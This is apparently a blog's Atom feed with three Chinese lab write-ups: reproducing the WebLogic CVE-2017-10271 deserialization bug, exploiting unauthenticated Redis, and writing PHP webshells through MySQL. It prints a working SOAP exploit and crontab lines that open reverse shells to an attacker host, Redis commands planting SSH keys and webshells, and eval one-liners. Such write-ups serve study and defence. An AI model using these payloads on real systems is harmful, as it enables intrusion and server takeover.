<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>redfish的学习笔记</title>
  
  <subtitle>redfish的学习笔记</subtitle>
  <link href="https://redredredfish.github.io/atom.xml" rel="self"/>
  
  <link href="https://redredredfish.github.io/"/>
  <updated>2021-12-06T03:09:51.923Z</updated>
  <id>https://redredredfish.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>weblogic反序列化漏洞的初级理解(一)</title>
    <link href="https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/"/>
    <id>https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/</id>
    <published>2021-07-08T03:07:00.000Z</published>
    <updated>2021-12-06T03:09:51.923Z</updated>
    
    <content type="html"><![CDATA[<p><strong>啥是weblogic</strong></p><blockquote><p>WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件<br>大概可以理解为tomcat pro max🙃</p></blockquote><p><strong>Weblogic反序列化漏洞的几个利用阶段</strong><br>从利用方式来看,分为三类</p><blockquote><p>1.直接通过T3协议发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)<br>2.利用T3协议配合RMP或ND接口反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用IIOP协议的CVE-2020-2551<br>3.通过 javabean XML方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p></blockquote><p><strong>漏洞复现</strong><br>由于漏洞众多，搭建环境比较复杂，还是先利用vulhub中的CVE-2017-10271、CVE-2018-2628、CVE-2018-2894、CVE-2020-14882几个标志性的漏洞环境进行复现。</p><p>先从最古老的开始</p><p><strong>CVE-2017-10271</strong></p><p>影响范围：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p><p>docker开启环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="literal">-2017</span><span class="literal">-10271</span><span class="comment"># docker-compose up -d</span></span><br></pre></td></tr></table></figure><p>远古版本，环境好大先忍一下</p><p>等待的过程中先理解一下漏洞原理以及vulhub给出的poc</p><blockquote><p>该漏洞主要针对weblogic的WLS-WebServices组件<br>属于上述反序列化漏洞利用的第三类<br>大致的原理通过传输javabean XML方式构造恶意XML数据造成代码执行</p></blockquote><p>结合poc来看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_131&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/ip/port 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大概是向网站的/wls-wsat/CoordinatorPortType路径传入xml数据，这串xml目的是反弹shell<br><img src="https://img-blog.csdnimg.cn/e2500d2d3ddb4d49bbdf14acc368c5ab.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>OK，环境起好开始复现</p><p>访问localhost:7001/wls-wsat/CoordinatorPortType，显示wls-wsat组件的一些配置信息，表示服务已经开启<br><img src="https://img-blog.csdnimg.cn/eed3402dcce94654be96b6284ffe06d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本地监听6666端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># nc -l -p 6666</span></span><br></pre></td></tr></table></figure><p>bp抓包重放构造好的数据包，注意字段Content-Type改为text/xml<br><img src="https://img-blog.csdnimg.cn/cea48ea1720d482daff11874f9990886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_50,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功反弹shell，服务器执行了我们传入的<br>/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br><img src="https://img-blog.csdnimg.cn/04d240f521704714b7b9f219bfbd052d.png" alt="在这里插入图片描述"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞利用的过程很简单<br>有两个疑问点</p><blockquote><p>1.wls-wsat组件如何处理xml数据<br>2.造成反序列化漏洞的关键点在哪</p></blockquote><p>尝试传入任意命令<br><img src="https://img-blog.csdnimg.cn/9be705e77d9448ada8c5aedf7d85f6ef.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在响应中看到了返回的xml数据以及整个处理过程的调用栈<br><img src="https://img-blog.csdnimg.cn/ab02563a2f654b6ea14cb3a14fad86d4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/89e4eb4967994b0ba45f623017f2c74b.png" alt="在这里插入图片描述"><br>可以看到处理过程最后调用了<code>java.beans.XMLDecoder</code>方法，该方法用于将XML数据反序列化为java对象，这里造成了无回显的命令执行</p><p>根据<a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md">vulhub提供的技术文档</a>、参考<a href="https://blog.51cto.com/skytina/2055335">大佬的分析过程</a>可以得知大致的处理过程<br><img src="https://img-blog.csdnimg.cn/img_convert/4e4c200cb59a992165ce7d99a8095563.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>1.根据POC，当我们传入&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;标签包裹的数据时，wls-wsat使用了weblogic自带的webservices处理程序来处理SOAP请求<br>2.该处理程序首先调用weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法获取到我们传入的xml数据为var1，定义var2为处理过的var1数据<br>3.通过var2.get()方法中的WorkAreaConstants.WORK_AREA_HEADER参数获取&lt;work:WorkContext &gt;标签中的内容<br>4.当var3不为空时，执行readHeaderOld(var3);</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/6a83462617931a7657bdcea01cb87b7d.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>5.在readHeaderOld中，实例化了WorkContextXmlInputAdapter，此时方法内的var4是java标签里的内容</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/010303fb6e49b8294420c3f88aa6d98e.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>6.在实例化WorkContextXmlInputAdapter中，直接调用xmlDecoder反序列化传入的xml数据，也就是处理过的var4</p></blockquote><p>从整个过程中可以发现，传入的xml数据从始至终都没有受到任何过滤，wls-wsat的类似剥洋葱的处理方式一层一层揭开最后直接反序列化，这样显然是很不安全滴。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;啥是weblogic&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件&lt;br&gt;大概可以理解为tomcat pro max🙃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="weblogic反序列化" scheme="https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问</title>
    <link href="https://redredredfish.github.io/2021/07/07/helloworld/"/>
    <id>https://redredredfish.github.io/2021/07/07/helloworld/</id>
    <published>2021-07-07T08:05:00.000Z</published>
    <updated>2021-12-06T03:10:31.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redis未授权访问的利用方式"><a href="#redis未授权访问的利用方式" class="headerlink" title="redis未授权访问的利用方式"></a>redis未授权访问的利用方式</h2><p><strong>漏洞原理：</strong><br>    Redis&lt;3.2默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的安全策略，比如添加防火墙黑白名单等等，这样会将Redis服务暴露在公网上。<br>如果在没有设置密码(默认为空)的情况下，会导致任意用户可以未授权访问Redis以及读取Redis的数据。攻击者利用Redis自身的提供的config命令，可以进行写文件操作，还可以将ssh公钥写入目标服务器./root/.ssh下的authotrized_keys 文件中，进而可以利用对应私钥直接使用ssh服务器登录目标服务器。<br>漏洞的产生条件有以下两点:</p><ol><li>Redis绑定在0.0.0.0:6379,且没有进行添加安全策略，直接暴露在公网</li><li>没有设置密码认证或者弱密码，可以免密登录redis服务</li></ol><p><strong>漏洞复现：</strong><br>环境：</p><ol><li>攻击机kali5.7.0 192.168.237.132</li><li>靶机1 Ubuntu16.04 192.168.237.128</li><li>靶机2 centOS7 192.168.237.133</li><li>redis 2.8.17</li></ol><p>靶机1开启redis-server，攻击机<code>./redis-cli -h</code> 尝试连接<br>由于靶机1没有开启安全策略且默认没有设置密码认证<br>造成攻击机可以未授权访问且执行命令获取敏感数据<br> <img src="https://img-blog.csdnimg.cn/6873e9d4e3da45ba88666a1477187c5d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>利用方式一：webshell</strong><br>攻击机进行未授权访问，利用redis的<code>config set</code>命令将webshell写入靶机2网站目录下(*Redis Config Set 命令可以动态地调整 Redis 服务器的配置)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir <span class="comment">#设置路径</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="comment">#设置文件名</span></span><br><span class="line"><span class="built_in">set</span> webshell <span class="comment">#写入key值“webshell”对应的值</span></span><br><span class="line">save <span class="comment">#将所有key值保存在文件中</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4794579e300c4dfbb8f128fc45613b8a.png" alt="在这里插入图片描述"></p><p>在靶机2上查看已经写入了shell.php文件<br><img src="https://img-blog.csdnimg.cn/13f46d7fdf2f477aa1f1b43080e35291.png" alt="在这里插入图片描述"></p><p>浏览器访问<code>http://靶机2/shell.php</code>,发现成功写入webshell<br><img src="https://img-blog.csdnimg.cn/0135013b3df04785ac006a4a0b7192d9.png" alt="在这里插入图片描述"></p><p>同理可写入一句话木马<br><code>\n\n\n</code>换行避免因&lt;?导致shell无法解析<br><img src="https://img-blog.csdnimg.cn/59b4b9b17924407ab064db617a35c649.png" alt="在这里插入图片描述"></p><p>菜刀成功连接<br><img src="https://img-blog.csdnimg.cn/c48cc4e5dae5436a8bce15d65c02e49b.png" alt="在这里插入图片描述"></p><p><strong>利用方式二：写入SSH公钥实现SSH登录</strong><br>将攻击机本机的公钥作为value，然后通过修改redis的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在靶机2的/root/.ssh下生一个授权的key，从而通过ssh登录靶机2。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">#生成ssh公钥和私钥,默认密码为空</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20e1056957864553a16b1efd5814267a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/947e26f0a96c4c779af4658604df15f8.png" alt="在这里插入图片描述"></p><p>将生成的公钥保存到ssh.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; ssh.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa0c918525c54c3f9607a4b20548e324.png" alt="在这里插入图片描述"><br>将保存的公钥ssh.txt写入靶机2 redis的key值ssh中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/ssh.txt | redis-cli -h 靶机2 -x <span class="built_in">set</span> ssh</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/f55a4e2ef0a349adbd682cca94433854.png" alt="在这里插入图片描述"></p><p>远程登录靶机2的redis服务，更改redis备份路径为ssh公钥存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d6a29e85e7804d6192eec815d17c73ac.png" alt="在这里插入图片描述"></p><p>设置上传公钥的备份文件名字为<code>authorized_keys</code>,保存上传<br><img src="https://img-blog.csdnimg.cn/39146a0f6f19408fb1fbe034113f9db3.png" alt="在这里插入图片描述"><br>攻击机使用ssh免密登录靶机2<br><img src="https://img-blog.csdnimg.cn/423ff5f4b3ab410a82c7a6dbad4348ab.png" alt="在这里插入图片描述"></p><p>成功登录靶机2<br><img src="https://img-blog.csdnimg.cn/e59317f4123d47f0916bceceab38c166.png" alt="在这里插入图片描述"></p><p><strong>利用方式三：crontab定时任务，反弹shell</strong><br>攻击机监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 端口</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/814ecd57633b4f3b8ac28290b13b2dd2.png" alt="在这里插入图片描述"></p><p>远程登录redis，写入定时任务，一分钟后执行bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">test</span> <span class="string">&quot;\n\n*/1 * *  * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机/监听端口 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="built_in">test</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8224058e9d40426db4d609b5924ebff2.png" alt="在这里插入图片描述"></p><p>反弹shell成功<br><img src="https://img-blog.csdnimg.cn/2fd620c007a64ee4b7a2e6a97a8434be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>利用方式四：执行lua脚本</strong><br>Redis在2.6推出了脚本功能，允许开发者使用lua语言编写脚本传到Redis中<br>执行。暂时还没找到怎么利用lua执行系统命令。</p><p>编写lua脚本test.lua输出字符hello,world!</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> a = <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3554ae78db6a4fb793899e17f0416f02.png" alt="在这里插入图片描述"><br>redis-cli –eval test.lua -h 靶机2<br><img src="https://img-blog.csdnimg.cn/175b98fe97a34b1a86f966a6f3517de8.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;redis未授权访问的利用方式&quot;&gt;&lt;a href=&quot;#redis未授权访问的利用方式&quot; class=&quot;headerlink&quot; title=&quot;redis未授权访问的利用方式&quot;&gt;&lt;/a&gt;redis未授权访问的利用方式&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;漏洞原理：&lt;/str</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="未授权访问漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="redis未授权访问" scheme="https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="未授权访问漏洞" scheme="https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Mysql写shell的几种方式</title>
    <link href="https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</id>
    <published>2021-07-06T03:04:00.000Z</published>
    <updated>2021-12-06T03:10:44.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysql写shell的几种方式"><a href="#Mysql写shell的几种方式" class="headerlink" title="Mysql写shell的几种方式"></a><strong>Mysql写shell的几种方式</strong></h2><p>当我们拿到数据库权限时，可通过数据库管理工具写入shell到目标服务器上，利用shell控制目标服务器。</p><p><strong>复现环境：</strong><br>phpstudy_pro 8.1.0.6<br>mysql 5.7.26 root权限<br>           网站绝对路径为D:\phpstudy_pro\WWW</p><p>   <strong>利用方式：</strong></p><ol><li>通过<code>outfile</code>写入shell<br>尝试通过outfile写入文件 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错[<span class="type">Code</span>: <span class="number">1290</span>, <span class="type">SQL</span> <span class="type">State</span>: <span class="type">HY000</span>]The MySQL server is running with the –secure<span class="operator">-file</span><span class="literal">-priv</span> option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p> 百度之后找到原因：mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为NULL，限制无法导入和导出文件</p><p>   解决办法：在my.ini配置文件[mysqld]下添加<code>secure_file_priv =&quot;&quot;</code>使其默认为空<br>   <img src="https://img-blog.csdnimg.cn/70497d772f4c4ba2b573352f25dae7a8.png" alt="在这里插入图片描述"></p><p>   新建查询select</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span> into outfile</span><br><span class="line"><span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;，成功写入shell.php文件  </span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/f79f35a5ba554bd094273ff47937fd24.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接<code>http://localhost:122/shell.php</code>成功<br> <img src="https://img-blog.csdnimg.cn/9ef8af7928304a1fa0bae9f9f23c8e6a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>向表插入shell并查询导出<br>将一句话木马作为数据插入test1表username字段中 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into`test1`(`username`) values (<span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/91bac466134a4bb3acd8333fa95afeb4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7e3aab22b44c73b0eda03f49cedc6a.png" alt="在这里插入图片描述"></p><p>   查询该数据并导出到shell.php </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> username from test1 into outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/da32a5781ab64cfaa087b6d3ee6d3d59.png" alt="在这里插入图片描述"></p><p>   蚁剑连接<code>http://localhost:122/shell.php</code>成功<br>   <img src="https://img-blog.csdnimg.cn/e201c8e019154fc698254e00c89fd436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>开启全局日志写入shell<br>首先查看全局日志是否开启 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%general%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p>  如图所示<code>general_log=OFF</code>全局日志未开启<br><img src="https://img-blog.csdnimg.cn/44c04cc005934a129868ddd10b8c2e3f.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启全局日志 </span><br><span class="line"><span class="built_in">set</span> global general_log = on; </span><br><span class="line">将全局日志路径设置为shell文件路径 </span><br><span class="line"><span class="built_in">set</span> global general_log_file = <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3c4264123e154720b26fab468da00c9a.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新建查询<span class="built_in">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>   mysql会将执行的语句记录到全局日志，从而将shell写入网站目录</p><p>   <img src="https://img-blog.csdnimg.cn/400cc6ceb41546b6a38f222c7cc776fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接成功</p><ol start="4"><li>慢查询日志写入shell<br>由于在mysql&gt;5.6.34中，<code>secure_file_priv</code>会阻拦我们使用outfile写入文件，没有服务器权限无法修改my.ini配置文件，可以利用慢查询日志写入shell，原理和利用全局日志差不多。首先一样查看慢查询日志是否开启 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%slow_query_log%&#x27;</span>;  </span><br></pre></td></tr></table></figure><img 